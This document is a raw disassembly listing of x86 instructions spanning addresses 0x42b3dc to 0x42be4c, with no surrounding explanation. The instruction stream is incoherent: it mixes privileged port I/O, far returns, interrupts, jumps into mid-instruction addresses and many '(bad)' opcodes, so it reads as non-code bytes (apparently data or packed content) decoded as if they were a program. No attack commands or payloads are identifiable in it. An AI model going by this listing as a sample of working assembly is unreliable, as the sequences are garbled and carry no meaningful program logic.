  42b3dc:	xchg   ebx,eax
  42b3dd:	icebp  
  42b3de:	push   ds
  42b3df:	dec    edx
  42b3e0:	xor    cl,BYTE PTR [edi]
  42b3e2:	sti    
  42b3e3:	cli    
  42b3e4:	ror    DWORD PTR [edx-0x80],cl
  42b3e7:	inc    edi
  42b3e8:	lods   eax,DWORD PTR ds:[esi]
  42b3e9:	xchg   DWORD PTR [ecx+edx*4],edi
  42b3ec:	push   0x2b7f8fcc
  42b3f1:	push   ds
  42b3f2:	test   eax,0x54398fe0
  42b3f7:	lock pop ecx
  42b3f9:	sbb    DWORD PTR [ecx+edi*2+0xe],0x502e1331
  42b401:	xchg   edi,eax
  42b402:	xchg   ecx,eax
  42b403:	xchg   ebx,eax
  42b404:	xor    ecx,DWORD PTR [ebx-0x76]
  42b407:	or     BYTE PTR [ebp-0x22],dl
  42b40a:	scas   eax,DWORD PTR es:[edi]
  42b40b:	mov    ebx,0xf9e10197
  42b410:	and    DWORD PTR [ecx+edx*2+0x30],eax
  42b414:	or     bh,BYTE PTR [ebp+0x363216b6]
  42b41a:	push   ss
  42b41b:	sub    DWORD PTR [eax-0x4de23119],0x97f09220
  42b425:	or     al,0xb1
  42b427:	sub    eax,0x7a99531f
  42b42c:	add    bh,al
  42b42e:	pop    ebx
  42b42f:	jg     0x42b47c
  42b431:	xchg   edx,eax
  42b432:	mov    esp,0x876803c7
  42b437:	lock retf 
  42b439:	mov    ebx,0x5d5fdd4d
  42b43e:	pop    ebp
  42b43f:	push   ebx
  42b440:	cmp    BYTE PTR [eax],al
	...
  42b4b2:	add    BYTE PTR [eax],al
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	lods   al,BYTE PTR ds:[esi]
  42b4c1:	sbb    ecx,DWORD PTR [edx+0x6e]
  42b4c4:	ss retf 
  42b4c6:	add    DWORD PTR [eax],eax
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    ch,bh
  42b4cd:	mov    al,0x82
  42b4cf:	fistp  WORD PTR [esi-0x645c15c4]
  42b4d5:	sub    al,0x38
  42b4d7:	add    DWORD PTR [ebp-0x45ca01a4],edi
  42b4dd:	pop    ds
  42b4de:	scas   eax,DWORD PTR es:[edi]
  42b4df:	cli    
  42b4e0:	cmp    eax,0xb1f19e1b
  42b4e5:	jne    0x42b557
  42b4e7:	sbb    eax,DWORD PTR [ecx]
  42b4e9:	and    bh,ah
  42b4eb:	sub    bl,BYTE PTR [edi+0x51]
  42b4ee:	sbb    eax,0xd199e72b
  42b4f3:	xchg   edx,eax
  42b4f4:	test   BYTE PTR [ebp*2-0x60e12164],0x5c
  42b4fc:	in     eax,0xa4
  42b4fe:	into   
  42b4ff:	mov    ds:0x6c4d16f4,eax
  42b504:	push   ds
  42b505:	in     eax,dx
  42b506:	cmp    eax,0xa3de45b0
  42b50b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42b50d:	retf   0x9690
  42b510:	out    0x62,al
  42b512:	dec    edx
  42b513:	in     eax,0xdd
  42b515:	aad    0xe1
  42b517:	stc    
  42b518:	inc    esi
  42b519:	js     0x42b578
  42b51b:	rcl    DWORD PTR [esi+0x17],1
  42b51e:	mov    dl,0x8d
  42b520:	mov    ebx,edi
  42b522:	push   esi
  42b523:	sbb    al,0x10
  42b525:	aam    0xa3
  42b527:	mov    edx,0x25baf3d1
  42b52c:	outs   dx,BYTE PTR ds:[esi]
  42b52d:	stos   DWORD PTR es:[edi],eax
  42b52e:	sbb    DWORD PTR [esi+0x33e73b5d],ecx
  42b534:	outs   dx,BYTE PTR ds:[esi]
  42b535:	hlt    
  42b536:	cmp    eax,0x59461a6e
  42b53b:	mov    dh,0x15
  42b53d:	inc    edi
  42b53e:	add    cl,ah
  42b540:	xchg   ebp,eax
  42b541:	pop    ebp
  42b542:	pop    ds
  42b543:	mov    esp,0xc9749f3c
  42b548:	test   edx,esi
  42b54a:	dec    edx
  42b54b:	in     eax,0xdb
  42b54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b54e:	in     eax,0x38
  42b550:	imul   ebx,esp,0xfc68b797
  42b556:	add    ecx,ecx
  42b558:	and    BYTE PTR [eax+0x7a],0xb8
  42b55c:	cli    
  42b55d:	sar    DWORD PTR ds:0xd4929f8d,1
  42b563:	pop    ds
  42b564:	neg    DWORD PTR [eax-0x6d8fc168]
  42b56a:	out    dx,al
  42b56b:	cmp    BYTE PTR [eax-0x11b4b243],0x1a
  42b572:	xchg   edi,eax
  42b573:	adc    eax,0xb0fa3e3e
  42b578:	ja     0x42b56f
  42b57a:	aaa    
  42b57b:	cmp    bl,BYTE PTR [edi]
  42b57d:	cmp    eax,0x81a1ad4a
  42b582:	aas    
  42b583:	push   0x11
  42b585:	and    BYTE PTR [ecx-0x19],dh
  42b588:	mov    esp,0x1a652090
  42b58d:	jecxz  0x42b60e
  42b58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b590:	adc    eax,0xd22135f8
  42b595:	mov    edx,0xedfa1a12
  42b59a:	sbb    eax,0xcdb453b2
  42b59f:	sub    dl,BYTE PTR [eax-0x1c0581e1]
  42b5a5:	int    0xe4
  42b5a7:	xchg   ebx,eax
  42b5a8:	push   DWORD PTR [ebx+ebx*4-0x44]
  42b5ac:	iret   
  42b5ad:	(bad)  
  42b5ae:	data16 (bad) 
  42b5b0:	fdivr  st,st(7)
  42b5b2:	xchg   esp,eax
  42b5b3:	mov    esp,0x3427db9
  42b5b8:	or     DWORD PTR [edx-0x28685086],ecx
  42b5be:	mov    edi,0x6d85fb
	...
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    dh,BYTE PTR [ebp+0x2c7b0a66]
  42b645:	int3   
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    al,bh
  42b64d:	lahf   
  42b64e:	cdq    
  42b64f:	jp     0x42b5da
  42b651:	icebp  
  42b652:	mov    bh,0x13
  42b654:	dec    ebp
  42b655:	jmp    0x1bd07385
  42b65a:	pop    ds
  42b65b:	push   0xffffffc2
  42b65d:	aam    0xc0
  42b65f:	ss and ch,bl
  42b662:	xor    eax,0xde6b9358
  42b667:	mov    ch,0xae
  42b669:	xor    al,0x68
  42b66b:	inc    eax
  42b66c:	adc    eax,0xc6b6d1b7
  42b671:	(bad)  [eax+ebp*2+0x743a7dfe]
  42b678:	xchg   ecx,eax
  42b679:	fxch   st(5)
  42b67b:	add    edi,DWORD PTR [ecx-0x28]
  42b67e:	lods   eax,DWORD PTR ds:[esi]
  42b67f:	aad    0x5c
  42b681:	dec    ebx
  42b682:	lods   eax,DWORD PTR ds:[esi]
  42b683:	mov    esp,edi
  42b685:	sbb    esi,esp
  42b687:	and    bl,BYTE PTR [ebx+0x33da87fb]
  42b68d:	pop    edi
  42b68e:	jo     0x42b65f
  42b690:	jmp    0x643a358e
  42b695:	push   ecx
  42b696:	mov    esi,0x6c11080b
  42b69b:	test   eax,0x992e40a4
  42b6a0:	and    al,0x56
  42b6a2:	push   ds
  42b6a3:	call   0x4c258664
  42b6a8:	push   0xb5c31f63
  42b6ad:	mov    dl,0x97
  42b6af:	ins    BYTE PTR es:[edi],dx
  42b6b0:	push   0xef6d13c3
  42b6b5:	fild   DWORD PTR [ebx-0x13]
  42b6b8:	repz mov cl,0x93
  42b6bb:	int3   
  42b6bc:	call   0x48c3eef5
  42b6c1:	or     ch,0xa5
  42b6c4:	jg     0x42b669
  42b6c6:	ss jo  0x42b728
  42b6c9:	cld    
  42b6ca:	scas   eax,DWORD PTR es:[edi]
  42b6cb:	pop    edi
  42b6cc:	sbb    al,BYTE PTR [ebp+ebx*2+0xf258188]
  42b6d3:	dec    eax
  42b6d4:	add    esi,ebx
  42b6d6:	mov    bh,0x4d
  42b6d8:	sbb    bl,BYTE PTR [edi]
  42b6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6db:	cwde   
  42b6dc:	lock fild WORD PTR [eax-0x74]
  42b6e0:	lods   al,BYTE PTR ds:[esi]
  42b6e1:	add    ah,al
  42b6e3:	dec    eax
  42b6e4:	aas    
  42b6e5:	cdq    
  42b6e6:	dec    eax
  42b6e7:	jo     0x42b740
  42b6e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6ea:	pop    ds
  42b6eb:	jno    0x42b6f3
  42b6ed:	jmp    0x42b678
  42b6ef:	fs pusha 
  42b6f1:	adc    DWORD PTR [edx-0x2f],esi
  42b6f4:	leave  
  42b6f5:	and    al,0xbb
  42b6f7:	xlat   BYTE PTR ds:[ebx]
  42b6f8:	mov    ds:0xd760e964,eax
  42b6fd:	adc    DWORD PTR [ebx+0x24],edi
  42b700:	mov    BYTE PTR [edx+0x1f],dl
  42b703:	jecxz  0x42b735
  42b705:	into   
  42b706:	out    0x44,al
  42b708:	push   edi
  42b709:	stos   DWORD PTR es:[edi],eax
  42b70a:	mov    al,0x35
  42b70c:	mov    al,BYTE PTR [edi]
  42b70e:	inc    ebx
  42b70f:	mov    esi,0x3f63c2b
  42b714:	mov    bl,0xf5
  42b716:	lods   eax,DWORD PTR ds:[esi]
  42b717:	lea    ebp,[esi+0x79abee18]
  42b71d:	mov    edx,0x5a8f5b64
  42b722:	mov    BYTE PTR [esi-0x4a],cl
  42b725:	dec    ecx
  42b726:	mov    dl,0xc9
  42b728:	or     eax,0x37aef3f7
  42b72d:	push   esi
  42b72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b72f:	test   al,0x6
  42b731:	stos   DWORD PTR es:[edi],eax
  42b732:	xchg   edx,eax
  42b733:	push   ecx
  42b734:	les    edx,FWORD PTR [eax-0x7ea8b1bb]
  42b73a:	in     eax,0x5e
  42b73c:	inc    ebx
  42b73d:	jbe    0x42b753
  42b73f:	cdq    
  42b740:	into   
  42b741:	jl     0x42b743
	...
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0x48a93afb
  42b7c3:	fbld   TBYTE PTR [edx]
  42b7c5:	int    0x1
  42b7c7:	add    dh,dh
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    ah,bl
  42b7cd:	(bad)  
  42b7ce:	aas    
  42b7cf:	mov    ah,dl
  42b7d1:	bound  edx,QWORD PTR cs:0xef99f9f2
  42b7d8:	pushf  
  42b7d9:	std    
  42b7da:	sub    BYTE PTR [eax-0x51],dl
  42b7dd:	daa    
  42b7de:	jle    0x42b7a2
  42b7e0:	frstor [edi]
  42b7e2:	sub    DWORD PTR [edx-0x67],0x30845c2a
  42b7e9:	stos   BYTE PTR es:[edi],al
  42b7ea:	jne    0x42b79a
  42b7ec:	sub    eax,0xc4d04e1e
  42b7f1:	xor    al,0x1e
  42b7f3:	pop    ebx
  42b7f4:	cwde   
  42b7f5:	dec    edi
  42b7f6:	dec    esp
  42b7f7:	ror    BYTE PTR [eax-0x7c9a0fdb],1
  42b7fd:	mov    esp,0xd6623e8a
  42b802:	jns    0x42b78c
  42b804:	mov    edx,0x22f56be7
  42b809:	add    BYTE PTR [ebp+0x18dc0849],0x6a
  42b810:	scas   eax,DWORD PTR es:[edi]
  42b811:	add    BYTE PTR [ebp+0x7180c0cb],bh
  42b817:	push   ebp
  42b818:	lods   eax,DWORD PTR ds:[esi]
  42b819:	xor    DWORD PTR [ebx+0x37620dba],edx
  42b81f:	outs   dx,BYTE PTR ds:[esi]
  42b820:	cli    
  42b821:	or     eax,0xeae4e3e1
  42b826:	repz retf 0x3348
  42b82a:	out    dx,al
  42b82b:	jb     0x42b88d
  42b82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b82e:	adc    eax,0x1c262044
  42b833:	or     ch,BYTE PTR [edi]
  42b835:	js     0x42b800
  42b837:	push   esi
  42b838:	aad    0xcf
  42b83a:	fstp   QWORD PTR [ecx+0x35]
  42b83d:	pusha  
  42b83e:	or     eax,0x4c934724
  42b843:	test   eax,0x3f7d08bb
  42b848:	push   ebp
  42b849:	jo     0x42b7eb
  42b84b:	add    ebx,edx
  42b84d:	ret    0x9712
  42b850:	scas   eax,DWORD PTR es:[edi]
  42b851:	pop    eax
  42b852:	xchg   edi,eax
  42b853:	(bad)  
  42b854:	pop    ds
  42b855:	push   ss
  42b856:	add    esi,esi
  42b858:	(bad)  
  42b859:	jb     0x42b8ac
  42b85b:	call   0xbb133290
  42b860:	enter  0x5c0d,0xf9
  42b864:	lahf   
  42b865:	xchg   esi,eax
  42b866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b867:	add    dl,BYTE PTR [ebp-0x52]
  42b86a:	loop   0x42b8b0
  42b86c:	cli    
  42b86d:	or     cl,BYTE PTR [ecx+eiz*1]
  42b870:	dec    esi
  42b871:	aam    0x19
  42b873:	addr16 jae 0x42b863
  42b876:	out    0xc7,al
  42b878:	mov    ch,0x9
  42b87a:	pop    edi
  42b87b:	loope  0x42b877
  42b87d:	push   0x7c
  42b87f:	in     eax,0x56
  42b881:	sub    DWORD PTR [eax-0x12],esp
  42b884:	imul   eax,DWORD PTR [esi],0x51
  42b887:	mov    al,0x87
  42b889:	lds    esp,FWORD PTR [edx-0x460b6031]
  42b88f:	fld    st(7)
  42b891:	jae    0x42b876
  42b893:	and    al,0xc3
  42b895:	xchg   BYTE PTR [ebx+0x6a2352d9],bl
  42b89b:	mov    edx,0x9f7390e8
  42b8a0:	outs   dx,BYTE PTR ds:[esi]
  42b8a1:	jecxz  0x42b852
  42b8a3:	ss jo  0x42b860
  42b8a6:	leave  
  42b8a7:	or     al,0x28
  42b8a9:	and    eax,0xcc736c7e
  42b8ae:	daa    
  42b8af:	data16 mov ch,0x47
  42b8b2:	or     al,0x53
  42b8b4:	out    0x78,eax
  42b8b6:	pop    esi
  42b8b7:	(bad)  
  42b8b8:	into   
  42b8b9:	xchg   esi,eax
  42b8ba:	fidiv  DWORD PTR [edi]
  42b8bc:	sub    al,0x6
  42b8be:	retf   
  42b8bf:	cmp    ebx,DWORD PTR ds:0x6d
	...
  42b931:	add    BYTE PTR [eax],al
  42b933:	add    BYTE PTR [eax+0x3fee1d93],ch
  42b939:	out    dx,al
  42b93a:	sti    
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	jae    0x42b8f0
  42b942:	or     BYTE PTR [eax+ebx*1-0x9fffe32],ah
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    BYTE PTR [ecx+0x3d283c7d],dh
  42b951:	or     bh,bl
  42b953:	ins    BYTE PTR es:[edi],dx
  42b954:	sbb    BYTE PTR [ecx-0x7e],bl
  42b957:	xor    DWORD PTR [ebx+0x536a0b8d],ebx
  42b95d:	jns    0x42b931
  42b95f:	adc    eax,0xb1d7bee6
  42b964:	cmp    DWORD PTR [eax-0x37],esi
  42b967:	test   al,0xd7
  42b969:	daa    
  42b96a:	or     esp,edx
  42b96c:	jo     0x42b98c
  42b96e:	push   0xe027455e
  42b973:	ror    ah,0x58
  42b976:	mov    ebx,0x57a9a653
  42b97b:	dec    esp
  42b97c:	xlat   BYTE PTR ds:[ebx]
  42b97d:	push   ebx
  42b97e:	addr16 and eax,0x3e773e83
  42b984:	mov    esi,0x31dd0000
  42b989:	test   BYTE PTR [eax],dl
  42b98b:	push   ebx
  42b98c:	(bad)
  42b98f:	jne    0x42b9d8
  42b991:	xchg   esp,eax
  42b992:	jae    0x42b99b
  42b994:	pop    eax
  42b995:	xchg   ebp,eax
  42b996:	xor    bl,BYTE PTR [edi+0x56]
  42b999:	shl    cl,0x2
  42b99c:	pop    ss
  42b99d:	xchg   ecx,eax
  42b99e:	repnz mov ebp,0xaa5690c1
  42b9a4:	shr    BYTE PTR [ecx-0x1d],1
  42b9a7:	or     BYTE PTR [ebx+0x49],dl
  42b9aa:	pop    ebp
  42b9ab:	cmp    eax,0xd1d93185
  42b9b0:	pop    DWORD PTR [esi]
  42b9b2:	(bad)  
  42b9b3:	and    eax,0xe391f488
  42b9b8:	in     al,0xee
  42b9ba:	data16 xor cl,BYTE PTR [ecx-0x7b]
  42b9be:	jb     0x42b9fd
  42b9c0:	cmp    al,0x28
  42b9c2:	sub    DWORD PTR [esi+eax*2-0x123faa97],ecx
  42b9c9:	stos   DWORD PTR es:[edi],eax
  42b9ca:	(bad)  
  42b9cb:	repz or BYTE PTR [edx+0x19],ch
  42b9cf:	mov    ds:0xecd52eeb,al
  42b9d4:	inc    ecx
  42b9d5:	mov    bh,bh
  42b9d7:	shl    DWORD PTR ds:0x4c25a952,cl
  42b9dd:	out    0x45,al
  42b9df:	inc    ebp
  42b9e0:	add    ebp,DWORD PTR [esi-0xcc212e0]
  42b9e6:	cmp    ebp,eax
  42b9e8:	sbb    dl,BYTE PTR [eax-0x618df829]
  42b9ee:	test   al,0x17
  42b9f0:	xchg   ebp,eax
  42b9f1:	call   0xc317:0xf3db63ec
  42b9f8:	rol    BYTE PTR [ebp+0x28dc9406],0x90
  42b9ff:	hlt    
  42ba00:	fs pop esp
  42ba02:	mov    al,ds:0x8dddafb1
  42ba07:	icebp  
  42ba08:	cwde   
  42ba09:	popf   
  42ba0a:	lea    ecx,[edx+0x27]
  42ba0d:	pop    es
  42ba0e:	push   edx
  42ba0f:	lahf   
  42ba10:	and    eax,0xb9039404
  42ba15:	mov    al,BYTE PTR [eax+0x34]
  42ba18:	pop    ds
  42ba19:	bound  eax,QWORD PTR ds:0x787174d3
  42ba1f:	sbb    eax,0x54e399d3
  42ba24:	adc    cl,bh
  42ba26:	arpl   bp,si
  42ba28:	nop
  42ba29:	mov    eax,0x6f39a0fa
  42ba2e:	xchg   edx,eax
  42ba2f:	jp     0x42ba2b
  42ba31:	inc    esp
  42ba32:	fs sub BYTE PTR es:[edx-0x70],bl
  42ba37:	stos   BYTE PTR es:[edi],al
  42ba38:	ret    
  42ba39:	out    0xb2,eax
  42ba3b:	push   0x38
  42ba3d:	mov    edx,0x1203a76d
	...
  42bab2:	add    BYTE PTR [eax],al
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x3579434c]
  42bac2:	xor    eax,eax
  42bac4:	push   cs
  42bac5:	iret   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	test   BYTE PTR [eax],0x0
  42bacb:	add    BYTE PTR [edi-0x55809d2c],al
  42bad1:	jbe    0x42bb0d
  42bad3:	push   eax
  42bad4:	loope  0x42ba96
  42bad6:	leave  
  42bad7:	or     DWORD PTR [ecx+0x70],eax
  42bada:	sbb    al,0xd8
  42badc:	jne    0x42bb31
  42bade:	(bad)  
  42bae0:	shr    BYTE PTR [ebx+0x13],cl
  42bae3:	mov    ds:0x5f09b54b,eax
  42bae8:	pop    ecx
  42bae9:	(bad)  
  42baeb:	jb     0x42bb3d
  42baed:	repz ret 0xd7f7
  42baf1:	mov    ah,0x71
  42baf3:	arpl   WORD PTR [eax-0x13],di
  42baf6:	arpl   WORD PTR [ebp+0x31],di
  42baf9:	pusha  
  42bafa:	jmp    0x42ba9d
  42bafc:	fmul   DWORD PTR [ecx-0x4eb99c48]
  42bb02:	nop
  42bb03:	adc    esi,DWORD PTR [ebx+0x3a]
  42bb06:	mov    ebx,0x98974ebf
  42bb0b:	adc    BYTE PTR [edx],bh
  42bb0d:	or     al,0x30
  42bb0f:	adc    eax,0x5a84d72d
  42bb14:	mov    BYTE PTR [ecx-0x1fc18da9],bl
  42bb1a:	pop    ds
  42bb1b:	popa   
  42bb1c:	in     eax,dx
  42bb1d:	scas   eax,DWORD PTR es:[edi]
  42bb1e:	mov    bh,0x63
  42bb20:	dec    eax
  42bb21:	mov    dl,0xd2
  42bb23:	call   0xaefe:0x10ead094
  42bb2a:	clc    
  42bb2b:	aam    0xb
  42bb2d:	into   
  42bb2e:	sub    BYTE PTR es:[esi+edi*2+0xf],al
  42bb33:	test   BYTE PTR [ecx-0x2def9330],ch
  42bb39:	int3   
  42bb3a:	inc    ebp
  42bb3b:	out    dx,al
  42bb3c:	jne    0x42bafd
  42bb3e:	or     al,0x66
  42bb40:	cmp    bh,BYTE PTR [eax+0x62]
  42bb43:	(bad)  
  42bb45:	push   esp
  42bb46:	loop   0x42bb4f
  42bb48:	add    DWORD PTR [ecx+0x5a],ebp
  42bb4b:	(bad)  
  42bb4c:	mov    al,ds:0x212cc3a4
  42bb51:	cld    
  42bb52:	int3   
  42bb53:	push   cs
  42bb54:	xchg   esp,eax
  42bb55:	neg    BYTE PTR [esi]
  42bb57:	(bad)  
  42bb58:	ss out 0x4e,eax
  42bb5b:	addr16 jae 0x42bbad
  42bb5e:	ins    DWORD PTR es:[edi],dx
  42bb5f:	mov    al,ds:0xa032bbc6
  42bb64:	out    0x90,al
  42bb66:	adc    DWORD PTR [esp+edx*4+0x54],ecx
  42bb6a:	nop
  42bb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb6c:	push   edi
  42bb6d:	icebp  
  42bb6e:	and    ecx,DWORD PTR [edi]
  42bb70:	xlat   BYTE PTR ds:[ebx]
  42bb71:	clc    
  42bb72:	add    ebp,esp
  42bb74:	out    dx,eax
  42bb75:	push   ds
  42bb76:	ret    0xcdba
  42bb79:	ror    DWORD PTR [edx],0x9c
  42bb7c:	xor    dl,BYTE PTR [edx-0x47]
  42bb7f:	(bad)  
  42bb80:	sub    al,0x42
  42bb82:	add    edx,DWORD PTR [ecx]
  42bb84:	mov    esi,0x165f4f08
  42bb89:	xchg   DWORD PTR [ecx],edx
  42bb8b:	push   esi
  42bb8c:	(bad)
  42bb90:	gs xchg ecx,eax
  42bb92:	push   ecx
  42bb93:	in     al,dx
  42bb94:	imul   BYTE PTR [eax-0x6a522186]
  42bb9a:	sub    BYTE PTR [esi-0x9fba9bb],dh
  42bba0:	xlat   BYTE PTR ds:[ebx]
  42bba1:	dec    edx
  42bba2:	push   0x61
  42bba4:	and    bl,BYTE PTR [ebx-0xc]
  42bba7:	xchg   esp,eax
  42bba8:	or     al,0xcd
  42bbaa:	clc    
  42bbab:	scas   eax,DWORD PTR es:[edi]
  42bbac:	stos   BYTE PTR es:[edi],al
  42bbad:	and    DWORD PTR [esi+eax*4+0x24b6251a],esp
  42bbb4:	cmp    eax,0x18124ba3
  42bbb9:	call   0x6ab82cbd
  42bbbe:	dec    DWORD PTR [ecx+0x9c54]
	...
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x3b
  42bc41:	mov    al,ds:0xd0049ec3
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    BYTE PTR [edi+ebx*2+0x3c],al
  42bc4f:	and    DWORD PTR [edx+0x4b],eax
  42bc52:	call   0xb0566c3f
  42bc57:	fiadd  WORD PTR [edx]
  42bc59:	(bad)  
  42bc5a:	cmp    edx,DWORD PTR [esp+eax*1]
  42bc5d:	dec    ecx
  42bc5e:	add    al,0x51
  42bc60:	popf   
  42bc61:	mov    esi,0xce6a3069
  42bc66:	sub    BYTE PTR ds:0xc44d1099,dl
  42bc6c:	outs   dx,BYTE PTR ds:[esi]
  42bc6d:	cmp    ch,BYTE PTR [ecx-0x4fbd32c9]
  42bc73:	mov    DWORD PTR [esi+edx*4+0x15b0bb30],esp
  42bc7a:	cli    
  42bc7b:	popf   
  42bc7c:	addr16 xchg edi,eax
  42bc7f:	dec    edx
  42bc80:	shl    DWORD PTR [esi-0x4f],0x65
  42bc84:	lds    ecx,FWORD PTR [ebx+0x7554391a]
  42bc8a:	hlt    
  42bc8b:	jg     0x42bc76
  42bc8d:	dec    esp
  42bc8e:	or     DWORD PTR [ebx],ebx
  42bc90:	mov    ah,0x49
  42bc92:	arpl   WORD PTR [edx+0xfea2400],sp
  42bc98:	ret    0x594b
  42bc9b:	retf   0x5c2a
  42bc9e:	cmp    al,0x16
  42bca0:	(bad)  
  42bca1:	arpl   WORD PTR ds:0x2241c989,ax
  42bca8:	(bad)  
  42bca9:	mov    WORD PTR [esi+0x78],ds
  42bcac:	sbb    ecx,0xe6371000
  42bcb2:	mov    eax,ds:0x1109d233
  42bcb7:	inc    esi
  42bcb8:	mov    edx,eax
  42bcba:	cmp    ebx,DWORD PTR [edx]
  42bcbc:	sbb    BYTE PTR [eax+edx*8],dl
  42bcbf:	jae    0x42bca8
  42bcc1:	imul   ah
  42bcc3:	rcl    BYTE PTR [edi+0x5a],1
  42bcc6:	push   edx
  42bcc7:	lds    ebp,FWORD PTR [edi-0x183ab448]
  42bccd:	mov    eax,ds:0x3fc12a0f
  42bcd2:	adc    eax,DWORD PTR [esi-0x7b]
  42bcd5:	adc    BYTE PTR [edi],ch
  42bcd7:	jns    0x42bd17
  42bcd9:	call   0xcdd17d73
  42bcde:	cmp    DWORD PTR ds:0x7c519935,ecx
  42bce4:	inc    esp
  42bce5:	sahf   
  42bce6:	es push ecx
  42bce8:	shl    DWORD PTR [ebx],0xad
  42bceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcec:	sbb    BYTE PTR [ebx-0x35f954c8],ah
  42bcf2:	mov    ch,0xf8
  42bcf4:	lods   eax,DWORD PTR ds:[esi]
  42bcf5:	fs adc eax,0x8f552d13
  42bcfb:	ds (bad) 
  42bcfe:	not    DWORD PTR [ebx+ebx*4]
  42bd01:	ja     0x42bd67
  42bd03:	fldenv [edi+edx*2+0x42]
  42bd07:	add    eax,0x7b530271
  42bd0c:	pop    DWORD PTR [edx-0x52]
  42bd0f:	xchg   edx,eax
  42bd10:	mov    ch,dh
  42bd12:	mov    dl,0x94
  42bd14:	addr16 push es
  42bd16:	mov    dl,0xbf
  42bd18:	push   ds
  42bd19:	xchg   ebp,eax
  42bd1a:	pusha  
  42bd1b:	in     al,dx
  42bd1c:	jl     0x42bcb4
  42bd1e:	mov    ecx,0xc17357d1
  42bd23:	jnp    0x42bd3f
  42bd25:	ins    BYTE PTR es:[edi],dx
  42bd26:	mov    al,0x49
  42bd28:	push   es
  42bd29:	or     al,bh
  42bd2b:	add    eax,0xbf9f74dd
  42bd30:	sub    BYTE PTR [eax-0x5e],bl
  42bd33:	sbb    al,0x4d
  42bd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd36:	sbb    al,0xe1
  42bd38:	pop    ebx
  42bd39:	jb     0x42bcfc
  42bd3b:	in     al,dx
  42bd3c:	mov    bh,0x43
  42bd3e:	push   0xffffffea
  42bd40:	xchg   DWORD PTR [esi+0x0],ebp
	...
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	pop    eax
  42bdc1:	aaa    
  42bdc2:	nop
  42bdc3:	cmp    edx,0xffffffd0
  42bdc6:	add    DWORD PTR [eax],eax
  42bdc8:	test   BYTE PTR [eax],0x0
  42bdcb:	add    BYTE PTR [edx],ah
  42bdcd:	aad    0xb9
  42bdcf:	loope  0x42bdea
  42bdd1:	add    al,0x8e
  42bdd3:	or     ah,ah
  42bdd5:	push   eax
  42bdd6:	out    0x93,eax
  42bdd8:	pop    ecx
  42bdd9:	xor    BYTE PTR [edx+0x4f],bl
  42bddc:	leave  
  42bddd:	cmp    BYTE PTR [ebx+ebx*2+0x35],bh
  42bde1:	aad    0x42
  42bde3:	mov    dh,0x3e
  42bde5:	mov    ebx,0x11654003
  42bdea:	cs jae 0x42bd93
  42bded:	sahf   
  42bdee:	loope  0x42bd99
  42bdf0:	dec    eax
  42bdf1:	jbe    0x42be4c
  42bdf3:	dec    ebx
  42bdf4:	outs   dx,BYTE PTR ds:[esi]
  42bdf5:	mov    ds:0xb6bd03b9,eax
  42bdfa:	jb     0x42be4d
  42bdfc:	pop    edx
  42bdfd:	xchg   ebp,eax
  42bdfe:	add    eax,0xa1a8c1c0
  42be03:	test   ch,0x87
  42be06:	sub    al,0xcc
  42be08:	sbb    DWORD PTR [edx+0x33e09ee6],esp
  42be0e:	test   BYTE PTR [ecx+0xc779f98],dh
  42be14:	mov    al,ds:0xef5f9d6c
  42be19:	adc    eax,0x86d09d6a
  42be1e:	jle    0x42bdc8
  42be20:	xchg   edi,eax
  42be21:	ror    DWORD PTR [eax],0x5d
  42be24:	cmp    al,0x64
  42be26:	je     0x42bdde
  42be28:	fldl2t 
  42be2a:	or     al,0x77
  42be2c:	pushf  
  42be2d:	out    0x25,al
  42be2f:	test   DWORD PTR [eax+ecx*4],ecx
  42be32:	stc    
  42be33:	pushf  
  42be34:	test   DWORD PTR [ecx-0x20],edx
  42be37:	and    BYTE PTR gs:[eax+edx*1+0x22],0xc
  42be3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be3e:	cli    
  42be3f:	xchg   esp,eax
  42be40:	push   ebp
  42be41:	mov    DWORD PTR [eax],eax
  42be43:	ss push ebp
  42be45:	sahf   
  42be46:	sbb    cl,BYTE PTR [edi+ebp*2+0x28]
  42be4a:	push   es
  42be4b:	push   esp
  42be4c:	push   esi
